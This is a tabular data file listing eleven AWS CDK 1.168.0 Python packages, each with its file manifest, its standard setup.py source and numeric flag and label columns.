aws-cdk.aws-s3-deployment-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-s3-deployment@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-s3-deployment"",
    ""version"": ""1.168.0"",
    ""description"": ""Constructs for deploying contents to S3 buckets"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_s3_deployment"",
        ""aws_cdk.aws_s3_deployment._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_s3_deployment._jsii"": [
            ""aws-s3-deployment@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_s3_deployment"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-cloudfront==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-efs==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-logs==1.168.0"",
        ""aws-cdk.aws-s3-assets==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.lambda-layer-awscli==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-s3-notifications-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-s3-notifications@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-s3-notifications"",
    ""version"": ""1.168.0"",
    ""description"": ""Bucket Notifications API for AWS S3"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_s3_notifications"",
        ""aws_cdk.aws_s3_notifications._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_s3_notifications._jsii"": [
            ""aws-s3-notifications@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_s3_notifications"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.aws-sns==1.168.0"",
        ""aws-cdk.aws-sqs==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-sam-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-sam@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-sam"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for the AWS Serverless Application Model (SAM) resources"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_sam"",
        ""aws_cdk.aws_sam._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_sam._jsii"": [
            ""aws-sam@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_sam"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 4 - Beta"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-secretsmanager-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-secretsmanager@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-secretsmanager"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::SecretsManager"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_secretsmanager"",
        ""aws_cdk.aws_secretsmanager._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_secretsmanager._jsii"": [
            ""aws-secretsmanager@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_secretsmanager"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-sam==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-servicediscovery-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-servicediscovery@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-servicediscovery"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::ServiceDiscovery"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_servicediscovery"",
        ""aws_cdk.aws_servicediscovery._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_servicediscovery._jsii"": [
            ""aws-servicediscovery@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_servicediscovery"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-elasticloadbalancingv2==1.168.0"",
        ""aws-cdk.aws-route53==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-signer-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-signer@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-signer"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::Signer"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_signer"",
        ""aws_cdk.aws_signer._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_signer._jsii"": [
            ""aws-signer@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_signer"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-sns-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-sns@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-sns"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::SNS"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_sns"",
        ""aws_cdk.aws_sns._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_sns._jsii"": [
            ""aws-sns@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_sns"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-codestarnotifications==1.168.0"",
        ""aws-cdk.aws-events==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-sqs==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-sns-subscriptions-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-sns-subscriptions@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-sns-subscriptions"",
    ""version"": ""1.168.0"",
    ""description"": ""CDK Subscription Constructs for AWS SNS"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_sns_subscriptions"",
        ""aws_cdk.aws_sns_subscriptions._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_sns_subscriptions._jsii"": [
            ""aws-sns-subscriptions@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_sns_subscriptions"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-sns==1.168.0"",
        ""aws-cdk.aws-sqs==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-sqs-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-sqs@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-sqs"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::SQS"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_sqs"",
        ""aws_cdk.aws_sqs._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_sqs._jsii"": [
            ""aws-sqs@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_sqs"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-ssm-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-ssm@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-ssm"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::SSM"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_ssm"",
        ""aws_cdk.aws_ssm._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_ssm._jsii"": [
            ""aws-ssm@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_ssm"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.cloud-assembly-schema==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-stepfunctions-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-stepfunctions@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-stepfunctions"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::StepFunctions"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_stepfunctions"",
        ""aws_cdk.aws_stepfunctions._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_stepfunctions._jsii"": [
            ""aws-stepfunctions@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_stepfunctions"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-events==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-logs==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
